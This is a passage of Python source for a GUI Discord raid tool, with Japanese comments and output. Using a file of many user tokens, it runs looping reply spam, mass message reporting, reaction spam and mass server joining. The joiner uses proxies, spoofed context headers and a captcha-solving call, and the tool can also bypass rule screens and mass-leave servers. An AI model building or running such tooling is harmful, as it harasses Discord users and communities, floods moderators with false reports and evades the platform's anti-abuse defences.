                ':green_apple:',':apple:',':pear:',':tangerine:',':lemon:',':banana:',':watermelon:',':grapes:',':blueberries:',':strawberry:',':melon:',':cherries:',':peach:',':mango:',':pineapple:',':coconut:',':kiwi:',':tomato:',':eggplant:',':avocado:',':olive:',':broccoli:',':leafy_green:',':bell_pepper:',':cucumber:',':hot_pepper:',':corn:',':carrot:',':garlic:',':onion:',':potato:',':sweet_potato:',':croissant:',':bagel:',':bread:',':french_bread:',':flatbread:',':pretzel:',':cheese:',':egg:',':cooking:',':butter:',':pancakes:',':waffle:',':bacon:',':cut_of_meat:',':poultry_leg:',':meat_on_bone:',':bone:',':hotdog:',':hamburger:',':fries:',':pizza:',':sandwich:',':stuffed_flatbread:',':falafel:',':taco:',':tamale:',':burrito:',':salad:',':shallow_pan_of_food:',':fondue:',':canned_food:',':jar:',':spaghetti:',':ramen:',':stew:',':curry:',':sushi:',':bento:',':dumpling:',':oyster:',':fried_shrimp:',':rice_ball:',':rice:',':rice_cracker:',':fish_cake:',':fortune_cookie:',':moon_cake:',':dango:',':oden:',':shaved_ice:',':ice_cream:',':icecream:',':pie:',':cupcake:',':cake:',':birthday:',':custard:',':lollipop:',':candy:',':chocolate_bar:',':popcorn:',':doughnut:',':cookie:',':chestnut:',':peanuts:',':beans:',':honey_pot:',':milk:',':pouring_liquid:',':baby_bottle:',':teapot:',':coffee:',':tea:',':mate:',':beverage_box:',':cup_with_straw:',':bubble_tea:',':sake:',':beer:',':beers:',':champagne_glass:',':wine_glass:',':tumbler_glass:',':cocktail:',':tropical_drink:',':champagne:',':ice_cube:',':spoon:',':fork_and_knife:',':fork_knife_plate:',':bowl_with_spoon:',':takeout_box:',':chopsticks:',':salt:',
                ':soccer:',':basketball:',':football:',':baseball:',':softball:',':tennis:',':volleyball:',':rugby_football:',':flying_disc:',':8ball:',':yo_yo:',':ping_pong:',':badminton:',':hockey:',':field_hockey:',':lacrosse:',':cricket_game:',':boomerang:',':goal:',':golf:',':kite:',':playground_slide:',':bow_and_arrow:',':fishing_pole_and_fish:',':diving_mask:',':boxing_glove:',':martial_arts_uniform:',':running_shirt_with_sash:',':skateboard:',':roller_skate:',':sled:',':ice_skate:',':curling_stone:',':ski:',':skier:',':snowboarder:',':parachute:',':person_lifting_weights:',':woman_lifting_weights:',':man_lifting_weights:',':people_wrestling:',':women_wrestling:',':men_wrestling:',':person_doing_cartwheel:',':woman_cartwheeling:',':man_cartwheeling:',':person_bouncing_ball:',':woman_bouncing_ball:',':man_bouncing_ball:',':person_fencing:',':person_playing_handball:',':woman_playing_handball:',':man_playing_handball:',':person_golfing:',':woman_golfing:',':man_golfing:',':horse_racing:',':person_in_lotus_position:',':woman_in_lotus_position:',':man_in_lotus_position:',':person_surfing:',':woman_surfing:',':man_surfing:',':person_swimming:',':woman_swimming:',':man_swimming:',':person_playing_water_polo:',':woman_playing_water_polo:',':man_playing_water_polo:',':person_rowing_boat:',':woman_rowing_boat:',':man_rowing_boat:',':person_climbing:',':woman_climbing:',':man_climbing:',':person_mountain_biking:',':woman_mountain_biking:',':man_mountain_biking:',':person_biking:',':woman_biking:',':man_biking:',':trophy:',':first_place:',':second_place:',':medal:',':third_place:',':military_medal:',':rosette:',':reminder_ribbon:',':ticket:',':tickets:',':circus_tent:',':person_juggling:',':woman_juggling:',':man_juggling:',':performing_arts:',':ballet_shoes:',':art:',':clapper:',':microphone:',':headphones:',':musical_score:',':musical_keyboard:',':drum:',':long_drum:',':saxophone:',':trumpet:',':accordion:',':guitar:',':banjo:',':violin:',':chess_pawn:',':game_die:',':dart:',':bowling:',':video_game:',':slot_machine:',':jigsaw:',
                ':red_car:',':taxi:',':blue_car:',':pickup_truck:',':bus:',':trolleybus:',':race_car:',':police_car:',':ambulance:',':fire_engine:',':minibus:',':truck:',':articulated_lorry:',':tractor:',':probing_cane:',':crutch:',':manual_wheelchair:',':motorized_wheelchair:',':scooter:',':bike:',':motor_scooter:',':motorcycle:',':auto_rickshaw:',':wheel:',':rotating_light:',':oncoming_police_car:',':oncoming_bus:',':oncoming_automobile:',':oncoming_taxi:',':aerial_tramway:',':mountain_cableway:',':suspension_railway:',':railway_car:',':train:',':mountain_railway:',':monorail:',':bullettrain_side:',':bullettrain_front:',':light_rail:',':steam_locomotive:',':train2:',':metro:',':tram:',':station:',':airplane:',':airplane_departure:',':airplane_arriving:',':airplane_small:',':seat:',':satellite_orbital:',':rocket:',':flying_saucer:',':helicopter:',':canoe:',':sailboat:',':speedboat:',':motorboat:',':cruise_ship:',':ferry:',':ship:',':ring_buoy:',':anchor:',':hook:',':fuelpump:',':construction:',':vertical_traffic_light:',':traffic_light:',':busstop:',':map:',':moyai:',':statue_of_liberty:',':tokyo_tower:',':european_castle:',':japanese_castle:',':stadium:',':ferris_wheel:',':roller_coaster:',':carousel_horse:',':fountain:',':beach_umbrella:',':beach:',':island:',':desert:',':volcano:',':mountain:',':mountain_snow:',':mount_fuji:',':camping:',':tent:',':house:',':house_with_garden:',':homes:',':house_abandoned:',':hut:',':construction_site:',':factory:',':office:',':department_store:',':post_office:',':european_post_office:',':hospital:',':bank:',':convenience_store:',':hotel:',':school:',':love_hotel:',':wedding:',':classical_building:',':church:',':mosque:',':synagogue:',':hindu_temple:',':kaaba:',':shinto_shrine:',':railway_track:',':motorway:',':japan:',':rice_scene:',':park:',':sunrise:',':sunrise_over_mountains:',':stars:',':sparkler:',':fireworks:',':city_sunset:',':city_dusk:',':cityscape:',':night_with_stars:',':milky_way:',':bridge_at_night:',':foggy:',
                ':watch:',':mobile_phone:',':calling:',':computer:',':keyboard:',':desktop:',':printer:',':mouse_three_button:',':trackball:',':joystick:',':compression:',':minidisc:',':floppy_disk:',':cd:',':dvd:',':vhs:',':camera:',':camera_with_flash:',':video_camera:',':movie_camera:',':projector:',':film_frames:',':telephone_receiver:',':telephone:',':pager:',':fax:',':tv:',':radio:',':microphone2:',':level_slider:',':control_knobs:',':compass:',':stopwatch:',':timer:',':alarm_clock:',':clock:',':hourglass:',':hourglass_flowing_sand:',':satellite:',':battery:',':low_battery:',':electric_plug:',':bulb:',':flashlight:',':candle:',':diya_lamp:',':fire_extinguisher:',':oil:',':money_with_wings:',':dollar:',':yen:',':euro:',':pound:',':coin:',':moneybag:',':credit_card:',':identification_card:',':gem:',':scales:',':ladder:',':toolbox:',':screwdriver:',':wrench:',':hammer:',':hammer_pick:',':tools:',':pick:',':carpentry_saw:',':nut_and_bolt:',':gear:',':mouse_trap:',':bricks:',':chains:',':magnet:',':gun:',':bomb:',':firecracker:',':axe:',':knife:',':dagger:',':crossed_swords:',':shield:',':smoking:',':coffin:',':headstone:',':urn:',':amphora:',':crystal_ball:',':prayer_beads:',':nazar_amulet:',':hamsa:',':barber:',':alembic:',':telescope:',':microscope:',':hole:',':x_ray:',':adhesive_bandage:',':stethoscope:',':pill:',':syringe:',':drop_of_blood:',':dna:',':microbe:',':petri_dish:',':test_tube:',':thermometer:',':broom:',':plunger:',':basket:',':roll_of_paper:',':toilet:',':potable_water:',':shower:',':bathtub:',':bath:',':soap:',':toothbrush:',':razor:',':sponge:',':bucket:',':squeeze_bottle:',':bellhop:',':key:',':key2:',':door:',':chair:',':couch:',':bed:',':sleeping_accommodation:',':teddy_bear:',':nesting_dolls:',':frame_photo:',':mirror:',':window:',':shopping_bags:',':shopping_cart:',':gift:',':balloon:',':flags:',':ribbon:',':magic_wand:',':piñata:',':confetti_ball:',':tada:',':dolls:',':izakaya_lantern:',':wind_chime:',':mirror_ball:',':red_envelope:',':envelope:',':envelope_with_arrow:',':incoming_envelope:',':e_mail:',':love_letter:',':inbox_tray:',':outbox_tray:',':package:',':label:',':placard:',':mailbox_closed:',':mailbox:',':mailbox_with_mail:',':mailbox_with_no_mail:',':postbox:',':postal_horn:',':scroll:',':page_with_curl:',':page_facing_up:',':bookmark_tabs:',':receipt:',':bar_chart:',':chart_with_upwards_trend:',':chart_with_downwards_trend:',':notepad_spiral:',':calendar_spiral:',':calendar:',':date:',':wastebasket:',':card_index:',':card_box:',':ballot_box:',':file_cabinet:',':clipboard:',':file_folder:',':open_file_folder:',':dividers:',':newspaper2:',':newspaper:',':notebook:',':notebook_with_decorative_cover:',':ledger:',':closed_book:',':green_book:',':blue_book:',':orange_book:',':books:',':book:',':bookmark:',':safety_pin:',':link:',':paperclip:',':paperclips:',':triangular_ruler:',':straight_ruler:',':abacus:',':pushpin:',':round_pushpin:',':scissors:',':pen_ballpoint:',':pen_fountain:',':black_nib:',':paintbrush:',':crayon:',':pencil:',':pencil2:',':mag:',':mag_right:',':lock_with_ink_pen:',':closed_lock_with_key:',':lock:',':unlock:',
                ':heart:',':orange_heart:',':yellow_heart:',':green_heart:',':blue_heart:',':purple_heart:',':black_heart:',':brown_heart:',':white_heart:',':broken_heart:',':heart_exclamation:',':two_hearts:',':revolving_hearts:',':heartbeat:',':heartpulse:',':sparkling_heart:',':cupid:',':gift_heart:',':mending_heart:',':heart_on_fire:',':heart_decoration:',':peace:',':cross:',':star_and_crescent:',':om_symbol:',':wheel_of_dharma:',':star_of_david:',':six_pointed_star:',':menorah:',':yin_yang:',':orthodox_cross:',':place_of_worship:',':ophiuchus:',':aries:',':taurus:',':gemini:',':cancer:',':leo:',':virgo:',':libra:',':scorpius:',':sagittarius:',':capricorn:',':aquarius:',':pisces:',':id:',':atom:',':accept:',':radioactive:',':biohazard:',':mobile_phone_off:',':vibration_mode:',':u6709:',':u7121:',':u7533:',':u55b6:',':u6708:',':eight_pointed_black_star:',':vs:',':white_flower:',':ideograph_advantage:',':secret:',':congratulations:',':u5408:',':u6e80:',':u5272:',':u7981:',':a:',':b:',':ab:',':cl:',':o2:',':sos:',':x:',':o:',':octagonal_sign:',':no_entry:',':name_badge:',':no_entry_sign:',':100:',':anger:',':hotsprings:',':no_pedestrians:',':do_not_litter:',':no_bicycles:',':non_potable_water:',':underage:',':no_mobile_phones:',':no_smoking:',':exclamation:',':grey_exclamation:',':question:',':grey_question:',':bangbang:',':interrobang:',':low_brightness:',':high_brightness:',':part_alternation_mark:',':warning:',':children_crossing:',':trident:',':fleur_de_lis:',':beginner:',':recycle:',':white_check_mark:',':u6307:',':chart:',':sparkle:',':eight_spoked_asterisk:',':negative_squared_cross_mark:',':globe_with_meridians:',':diamond_shape_with_a_dot_inside:',':m:',':cyclone:',':zzz:',':atm:',':wc:',':wheelchair:',':parking:',':u7a7a:',':sa:',':passport_control:',':customs:',':baggage_claim:',':left_luggage:',':elevator:',':mens:',':womens:',':baby_symbol:',':restroom:',':put_litter_in_its_place:',':cinema:',':signal_strength:',':koko:',':symbols:',':information_source:',':abc:',':abcd:',':capital_abcd:',':ng:',':ok:',':up:',':cool:',':new:',':free:',':zero:',':one:',':two:',':three:',':four:',':five:',':six:',':seven:',':eight:',':nine:',':keycap_ten:',':1234:',':hash:',':asterisk:',':eject:',':arrow_forward:',':pause_button:',':play_pause:',':stop_button:',':record_button:',':track_next:',':track_previous:',':fast_forward:',':rewind:',':arrow_double_up:',':arrow_double_down:',':arrow_backward:',':arrow_up_small:',':arrow_down_small:',':arrow_right:',':arrow_left:',':arrow_up:',':arrow_down:',':arrow_upper_right:',':arrow_lower_right:',':arrow_lower_left:',':arrow_upper_left:',':arrow_up_down:',':left_right_arrow:',':arrow_right_hook:',':leftwards_arrow_with_hook:',':arrow_heading_up:',':arrow_heading_down:',':twisted_rightwards_arrows:',':repeat:',':repeat_one:',':arrows_counterclockwise:',':arrows_clockwise:',':musical_note:',':notes:',':heavy_plus_sign:',':heavy_minus_sign:',':heavy_division_sign:',':heavy_multiplication_x:',':heavy_equals_sign:',':infinity:',':heavy_dollar_sign:',':currency_exchange:',':tm:',':copyright:',':registered:',':wavy_dash:',':curly_loop:',':loop:',':end:',':back:',':on:',':top:',':soon:',':heavy_check_mark:',':ballot_box_with_check:',':radio_button:',':white_circle:',':black_circle:',':red_circle:',':blue_circle:',':brown_circle:',':purple_circle:',':green_circle:',':yellow_circle:',':orange_circle:',':small_red_triangle:',':small_red_triangle_down:',':small_orange_diamond:',':small_blue_diamond:',':large_orange_diamond:',':large_blue_diamond:',':white_square_button:',':black_square_button:',':black_small_square:',':white_small_square:',':black_medium_small_square:',':white_medium_small_square:',':black_medium_square:',':white_medium_square:',':black_large_square:',':white_large_square:',':orange_square:',':blue_square:',':red_square:',':brown_square:',':purple_square:',':green_square:',':yellow_square:',':speaker:',':mute:',':sound:',':loud_sound:',':bell:',':no_bell:',':mega:',':loudspeaker:',':speech_left:',':eye_in_speech_bubble:',':speech_balloon:',':thought_balloon:',':anger_right:',':spades:',':clubs:',':hearts:',':diamonds:',':black_joker:',':flower_playing_cards:',':mahjong:',':clock1:',':clock2:',':clock3:',':clock5:',':clock4:',':clock6:',':clock7:',':clock8:',':clock9:',':clock10:',':clock11:',':clock12:',':clock130:',':clock230:',':clock330:',':clock430:',':clock530:',':clock630:',':clock730:',':clock830:',':clock930:',':clock1030:',':clock1130:',':clock1230:',':female_sign:',':male_sign:',':transgender_symbol:',':medical_symbol:',':regional_indicator_z:',':regional_indicator_y:',':regional_indicator_x:',':regional_indicator_w:',':regional_indicator_v:',':regional_indicator_u:',':regional_indicator_t:',':regional_indicator_s:',':regional_indicator_r:',':regional_indicator_q:',':regional_indicator_p:',':regional_indicator_o:',':regional_indicator_n:',':regional_indicator_m:',':regional_indicator_l:',':regional_indicator_k:',':regional_indicator_j:',':regional_indicator_i:',':regional_indicator_h:',':regional_indicator_g:',':regional_indicator_f:',':regional_indicator_e:',':regional_indicator_d:',':regional_indicator_c:',':regional_indicator_b:',':regional_indicator_a:',
                ':flag_white:',':flag_black:',':checkered_flag:',':triangular_flag_on_post:',':rainbow_flag:',':transgender_flag:',':pirate_flag:',':flag_af:',':flag_ax:',':flag_al:',':flag_dz:',':flag_as:',':flag_ad:',':flag_ao:',':flag_ai:',':flag_aq:',':flag_ag:',':flag_ar:',':flag_am:',':flag_aw:',':flag_au:',':flag_at:',':flag_az:',':flag_bs:',':flag_bh:',':flag_bd:',':flag_bb:',':flag_by:',':flag_be:',':flag_bz:',':flag_bj:',':flag_bm:',':flag_bt:',':flag_bo:',':flag_ba:',':flag_bw:',':flag_br:',':flag_io:',':flag_vg:',':flag_bn:',':flag_bg:',':flag_bf:',':flag_bi:',':flag_kh:',':flag_cm:',':flag_ca:',':flag_ic:',':flag_cv:',':flag_bq:',':flag_ky:',':flag_cf:',':flag_td:',':flag_cl:',':flag_cn:',':flag_cx:',':flag_cc:',':flag_co:',':flag_km:',':flag_cg:',':flag_cd:',':flag_ck:',':flag_cr:',':flag_ci:',':flag_hr:',':flag_cw:',':flag_cy:',':flag_cz:',':flag_dk:',':flag_dj:',':flag_dm:',':flag_do:',':flag_ec:',':flag_eg:',':flag_sv:',':flag_gq:',':flag_er:',':flag_ee:',':flag_et:',':flag_eu:',':flag_fk:',':flag_fo:',':flag_fj:',':flag_fi:',':flag_fr:',':flag_gf:',':flag_pf:',':flag_tf:',':flag_ga:',':flag_gm:',':flag_ge:',':flag_de:',':flag_gh:',':flag_gi:',':flag_gr:',':flag_gl:',':flag_gd:',':flag_gp:',':flag_gu:',':flag_gt:',':flag_gg:',':flag_gn:',':flag_gw:',':flag_gy:',':flag_ht:',':flag_hn:',':flag_hk:',':flag_hu:',':flag_is:',':flag_in:',':flag_id:',':flag_ir:',':flag_iq:',':flag_ie:',':flag_im:',':flag_it:',':flag_il:',':flag_jm:',':flag_jp:',':crossed_flags:',':flag_je:',':flag_jo:',':flag_kz:',':flag_ke:',':flag_ki:',':flag_xk:',':flag_kw:',':flag_kg:',':flag_la:',':flag_lv:',':flag_lb:',':flag_ls:',':flag_ly:',':flag_lr:',':flag_li:',':flag_lt:',':flag_lu:',':flag_mo:',':flag_mk:',':flag_mg:',':flag_mw:',':flag_my:',':flag_mv:',':flag_ml:',':flag_mt:',':flag_mh:',':flag_mq:',':flag_mr:',':flag_mu:',':flag_yt:',':flag_mx:',':flag_fm:',':flag_md:',':flag_mc:',':flag_mn:',':flag_me:',':flag_ms:',':flag_ma:',':flag_mz:',':flag_mm:',':flag_na:',':flag_nr:',':flag_np:',':flag_nl:',':flag_nc:',':flag_nz:',':flag_ni:',':flag_ne:',':flag_ng:',':flag_nu:',':flag_nf:',':flag_kp:',':flag_mp:',':flag_no:',':flag_om:',':flag_pk:',':flag_pw:',':flag_ps:',':flag_pa:',':flag_pg:',':flag_py:',':flag_pe:',':flag_ph:',':flag_pn:',':flag_pl:',':flag_pt:',':flag_pr:',':flag_qa:',':flag_re:',':flag_ro:',':flag_ru:',':flag_rw:',':flag_ws:',':flag_sm:',':flag_st:',':flag_sa:',':flag_sn:',':flag_rs:',':flag_sc:',':flag_sl:',':flag_sg:',':flag_sx:',':flag_sk:',':flag_si:',':flag_gs:',':flag_sb:',':flag_so:',':flag_za:',':flag_kr:',':flag_ss:',':flag_es:',':flag_lk:',':flag_bl:',':flag_sh:',':flag_kn:',':flag_lc:',':flag_pm:',':flag_vc:',':flag_sd:',':flag_sr:',':flag_sz:',':flag_se:',':flag_ch:',':flag_sy:',':flag_tw:',':flag_tj:',':flag_tz:',':flag_th:',':flag_tl:',':flag_tg:',':flag_tk:',':flag_to:',':flag_tt:',':flag_tn:',':flag_tr:',':flag_tm:',':flag_tc:',':flag_vi:',':flag_tv:',':flag_ug:',':flag_ua:',':flag_ae:',':flag_gb:',':england:',':scotland:',':wales:',':flag_us:',':flag_uy:',':flag_uz:',':flag_vu:',':flag_va:',':flag_ve:',':flag_vn:',':flag_wf:',':flag_eh:',':flag_ye:',':flag_zm:',':flag_zw:',':flag_ac:',':flag_bv:',':flag_cp:',':flag_ea:',':flag_dg:',':flag_hm:',':flag_mf:',':flag_sj:',':flag_ta:',':flag_um:',':united_nations:'
                )
                ttk.Combobox(frame, height=20, values=module, textvariable=emojiname_text).place(x=225,y=385)
                strsbt = tk.Button(frame, text="Start Reaction",foreground='black', background='#88CEEB', command=reaspam_start)
                strsbt.place(x=225,y=410,width=155,height=35)  
                # Reply Spam
                canvas = tk.Canvas(frame, bg="grey13", height=320, width=200)
                canvas.place(x=410, y=5)
                rpyspamlabel = tk.Label(frame, text="Reply Spam",font=("Supernova",17,"bold"),foreground="#fff",bg="grey13")
                rpyspamlabel.place(x=425, y=10)        
                rpysvidlabel = tk.Label(frame, text="Server ID",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
                rpysvidlabel.place(x=425, y=65)       
                rpysvidentry = tk.Entry(frame, width=25,textvariable=rpyserverid_text)
                rpysvidentry.place(x=425, y=90)                
                rpychidlabel = tk.Label(frame, text="Channel ID",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
                rpychidlabel.place(x=425, y=115)                
                rpychidentry = tk.Entry(frame, width=25,textvariable=rpychannelid_text)
                rpychidentry.place(x=425, y=140)
                rpychidlabel = tk.Label(frame, text="Meesage ID",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
                rpychidlabel.place(x=425, y=165)                
                rpychidentry = tk.Entry(frame, width=25,textvariable=rpymessageid_text)
                rpychidentry.place(x=425, y=190)              
                rpystsmbt = tk.Button(frame, text="Start Spam",foreground='black', background='#88CEEB', command=rpyspammer_start)
                rpystsmbt.place(x=425,y=230,width=150,height=40)
                rpywismbt = tk.Button(frame, text="Stop Spam",foreground='black', background='#88CEEB', command=rpystop_spam)
                rpywismbt.place(x=425,y=280,width=150,height=40)    
            def joinerleaver():
                global joinerinvite_text
                global elc
                global leaverserverid_text
                elc = tk.BooleanVar()
                elc.set(False)
                joinerinvite_text = tk.StringVar()
                leaverserverid_text = tk.StringVar()
                frame = tk.Frame(root, width=1165, height=540)
                frame.place(x=135, y=95)
                frame.configure(bg="grey13")  #grey13 ##fff         
                # joiner
                canvas = tk.Canvas(frame, bg="grey13", height=200, width=200)
                canvas.place(x=15, y=5)
                joinerlabel = tk.Label(frame, text="Joiner",font=("Supernova",20,"bold"),foreground="#fff",bg="grey13")
                joinerlabel.place(x=30, y=10)
                joinerinvitelabel = tk.Label(frame, text="Invite Code",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
                joinerinvitelabel.place(x=30, y=65)
                joinerinviteentry = tk.Entry(frame, width=25,textvariable=joinerinvite_text)
                joinerinviteentry.place(x=30, y=90)
                rlsr = tk.Checkbutton(frame, text="Rule Screen",variable=elc,bg="#7c64e4",height=0, width=17)
                rlsr.place(x=30, y=120)                     
                joinerstsmbt = tk.Button(frame, text="Start Joiner",foreground='black', background='#88CEEB', command=joiner_start)
                joinerstsmbt.place(x=30,y=170,width=155,height=35)   
                # leaver
                canvas = tk.Canvas(frame, bg="grey13", height=160, width=200)
                canvas.place(x=225, y=5)
                leaverlabel = tk.Label(frame, text="Leaver",font=("Supernova",20,"bold"),foreground="#fff",bg="grey13")
                leaverlabel.place(x=250, y=10)
                leaverinvitelabel = tk.Label(frame, text="Server Id",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
                leaverinvitelabel.place(x=250, y=65)
                leaverinviteentry = tk.Entry(frame, width=25,textvariable=leaverserverid_text)
                leaverinviteentry.place(x=250, y=90)         
                leaverstsmbt = tk.Button(frame, text="Start Leaver",foreground='black', background='#88CEEB', command=leaver_start)
                leaverstsmbt.place(x=250,y=120,width=155,height=35)                       
            def more():
                global hysq_text
                hysq_text =tk.StringVar()
                frame = tk.Frame(root, width=1165, height=540)
                frame.place(x=135, y=95)
                frame.configure(bg="grey13")  #grey13 ##fff                     
                canvas = tk.Canvas(frame, bg="grey13", height=150, width=200)
                canvas.place(x=15, y=5)
                hschlabel = tk.Label(frame, text="HypeSquad Change",font=("Supernova",15,"bold"),foreground="#fff",bg="grey13")
                hschlabel.place(x=20, y=10)
                hschselectlabel = tk.Label(frame, text="HypeSquad",font=("Supernova",12,"bold"),foreground="#fff",bg="grey13")
                hschselectlabel.place(x=30, y=60)
                hypesquad = ('Bravery','Brilliance','Balance','None')
                ttk.Combobox(frame, height=20, values=hypesquad, textvariable=hysq_text).place(x=30,y=85)
                hschstsmbt = tk.Button(frame, text="Start Change",foreground='black', background='#88CEEB', command=hsch_start)
                hschstsmbt.place(x=30,y=120,width=155,height=35)  
            # module main
            global spamchannelid_text
            global spamserverid_text
            global repchannelid_text
            global reachannelid_text
            global reamessageid_text
            global emojiname_text
            global rpychannelid_text
            global rpyserverid_text
            global rpymessageid_text
            global alc
            global blc
            global clc
            global dlc
            global elc
            global mentioncount
            global token_text
            global joinerinvite_text
            global leaverserverid_text
            global hysq_text
            def hsch_start():
                threading.Thread(target=start_hsch).start()
            def start_hsch():    
                house_id = hysq_text.get()
                with open(token_file + '.txt') as f:
                    lines = f.readlines()
                    while True:
                        for l in lines:
                            try:
                                if house_id == "Bravery":
                                    house_id = "1"
                                if house_id == "Brilliance":    
                                    house_id = "2"
                                if house_id == "Balance":
                                    house_id = "3"
                                if house_id == "None":
                                    house_id = "4"        
                                if house_id == "4":
                                    headers = {"authorization": l.rstrip("\n")}
                                    res = requests.delete(f"https://discord.com/api/v9/hypesquad/online", headers=headers)
                                    if res.status_code == 204:
                                        print(f"{Fore.GREEN} 成功{Fore.RESET}")
                                    else: 
                                        print(f"{Fore.RED} 失敗{Fore.RESET}")
                                    time.sleep(1)
                                    menu()
                                payload = {"house_id": house_id}
                                headers = {"authorization": l.rstrip("\n")}
                                res = requests.post(f"https://discord.com/api/v9/hypesquad/online", headers=headers, json=payload)
                                if res.status_code == 204:
                                    print(f"{Fore.GREEN} 成功{Fore.RESET}")
                                else: 
                                    print(f"{Fore.RED} 失敗{Fore.RESET}")
                                time.sleep(1)
                                menu()
                            except Exception as e:
                                print("Error: "+ e)          
            def leaver_start():
                threading.Thread(target=start_leaver).start()    
            def start_leaver():
                guild = leaverserverid_text.get()    
                with open(token_file + '.txt') as f:
                    lines = f.readlines()
                    for l in lines:
                        try:
                            headers = {"authorization": l.rstrip("\n")}
                            res = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild}", headers=headers)
                        except:
                                print("エラーが発生しました。") 
            def joiner_start():
                threading.Thread(target=start_joiner).start()
            def start_joiner():    
                invid = joinerinvite_text.get()
                def join():
                    with open(token_file + '.txt') as f:
                        lines = f.readlines()
                        for l in lines:
                            print("start")
                            token = l.rstrip("\n")
                            session = get_session()
                            proxies = get_proxies()[0]
                            headers = get_headers()
                            headers["Referer"] = "https://discord.com/invite/" + invid
                            headers["x-context-properties"] = "addr1qyle9n2s8us209evf0u5snwy8xd9shc5gqxpsjcxv3xvs4fljtx4q0eq57tjcjlefpxugwv6tp03gsqvrp9svezvep2sl993zr"
                            headers["authorization"] = token
                            
                            session.get("https://discord.com/api/v9/experiments?with_guild_experiments=true", headers=headers, proxy=proxies)
                            
                            del headers["x-context-properties"]
                            
                            xcreq = session.get("https://discord.com/api/v9/invites/" + invid + "?with_counts=true&with_expiration=true", headers=headers, proxy=proxies).json()
                            
                            chid = xcreq["channel"]["id"]
                            guildid = xcreq["guild"]["id"]
                            chtype = xcreq["channel"]["type"]
                            xxx = {
                                "location": "Accept Invite Page",
                                "location_guild_id": str(guildid),
                                "location_channel_id": str(chid),
                                "location_channel_type": str(chtype) 
                            }
                            headers["x-context-properties"] = base64.b64encode(json.dumps(xxx, separators=(',', ':')).encode()).decode()
                            try:
                                    joinreq = session.post(f"https://discord.com/api/v9/invites/{invid}", headers=headers, json={})
                                    if "captcha_key" not in joinreq.json():
                                        if "You need to verify your account in order to perform this action." in joinreq.json():
                                            print(f"{token}は死亡しています。")
                                        print(f"参加しました。")
                                        if elc.get():
                                            bypass(token, guildid, session)
                                    if "captcha_key" in joinreq.json():
                                        wsitekey = joinreq.json()['captcha_sitekey']
                                        print(f"キャプチャーに検出されました。")
                                        crqdata = joinreq.json()["captcha_rqdata"]
                                        captchakey = solvecaptcha(sitekey=wsitekey, rqdata=crqdata, useragent=headers["user-agent"])
                                        captcha_rqtoken = joinreq.json()["captcha_rqtoken"]
                                        payload = {'captcha_key': captchakey, 'captcha_rqtoken': captcha_rqtoken}
                                        joinreq2 = session.post(f"https://discord.com/api/v9/invites/{invid}", headers=headers, json=payload)
                                        if joinreq2.status_code == 200:
                                            print(f"参加完了")
                                            if option == "y":
                                                bypass(token, guildid, session)
                                        else:
                                            print(f"参加失敗")
                                            #continue
                            except Exception as err:
                                    print(f"エラーが発生しました。")
                with ThreadPoolExecutor(max_workers=4) as executor:
                    executor.submit(join)
            def rpyspammer_start():
                time.sleep(0.5)
                threading.Thread(target=start_rpyspam).start()
            def start_rpyspam():
                guild_id = rpyserverid_text.get()
                channel_id = rpychannelid_text.get()
                message_id = rpymessageid_text.get()
                with open(token_file + '.txt') as f:
                    lines = f.readlines()
                    while True:
                        for l in lines:
                                try:
                                    randoms = randomname(10)
                                    payload = {"content":f"{messages}\n"+randoms,"message_reference":{"guild_id":f"{guild_id}","channel_id":f"{channel_id}","message_id":f"{message_id}"}}
                                    headers = {"authorization":l.rstrip("\n")}
                                    req = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages",headers=headers,json=payload)
                                    if req.status_code == 204:
                                        print(Color.GREEN+"成功 token:"+Color.RESET+l.rstrip("\n"))
                                    if req.status_code == 403:
                                        print(Color.RED+"失敗 token:"+Color.RESET+l.rstrip("\n"))    
                                    if req.status_code == 429:
                                        print(Color.RED+"⚠️レート制限⚠️"+Color.RESET)
                                except:
                                    print("失敗！")  
            def rpystop_spam():
                # とめかたわかりましぇん
                print("Stop Spam") 
            def repspam_start():
                threading.Thread(target=start_repspam).start()
            def start_repspam():
                print("RepSpam Start")
                channel_id = reachannelid_text.get()
                message_id = reamessageid_text.get()
                with open(token_file + '.txt') as f:
                    lines = f.readlines()
                    while True:
                        for l in lines:
                            try:
                                payload = {"version":"1.0","variant":"3","language":"en","breadcrumbs":[3,14,52],"elements":{},"name":"message","channel_id":f"{channel_id}","message_id":f"{message_id}"}
                                headers = {"authorization": l.rstrip("\n")}
                                res = requests.post(f"https://discord.com/api/v9/reporting/message", headers=headers, json=payload)
                                print(l.rstrip("\n"))
                                print(res.text)
                            except Exception as e:
                                print("Error: "+ e)         
            def reaspam_start():
                threading.Thread(target=start_reaspam).start()
            def start_reaspam():
                print("ReaSpam Start")
                if reachannelid_text.get() == "":
                    print(Fore.RED+"PLS INPUT CHANNEL_ID"+Fore.RESET)
                if reamessageid_text.get() == "":                        
                    print(Fore.RED+"PLS INPUT MESSAGE_ID"+Fore.RESET)
                print("Emoji >> "+emojiname_text.get()+" Channel Id >> "+reachannelid_text.get()+" Message Id >> "+reamessageid_text.get())
                emoji = emojiname_text.get()
                channel_id = reachannelid_text.get()
                message_id = reamessageid_text.get()
                token = token_text.get()
                if dlc.get():    
                    if token_text.get() == "":
                        print(Fore.RED+"PLS INPUT TOKEN"+Fore.RESET) 
                    mslist = get_messages(token,int(channel_id))
                    with open(token_file + '.txt') as f:
                        lines = f.readlines()
                        while True:
                            for l in lines:
                                try:
                                    message_id = random.choice(mslist)
                                    emojii = eeemj.emojize(emoji, language='alias')
                                    emojiaa = urllib.parse.quote(emojii)
                                    message_id = random.choice(mslist)
                                    headers = {"authorization": l.rstrip("\n")}
                                    req = requests.put(f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emojiaa}/%40me", headers=headers)
                                    if req.status_code == 204:
                                        print(Color.GREEN+"成功 token:"+Color.RESET+l.rstrip("\n"))
                                    if req.status_code == 403:
                                        print(Color.RED+"失敗 token:"+Color.RESET+l.rstrip("\n"))    
                                    if req.status_code == 429:
                                        print(Color.RED+"⚠️レート制限⚠️"+Color.RESET)                                      
                                except Exception as e:
                                        print("Error: "+ e)              
                else:       
                    with open(token_file + '.txt') as f:
                        lines = f.readlines()
                        for l in lines:
                            try:
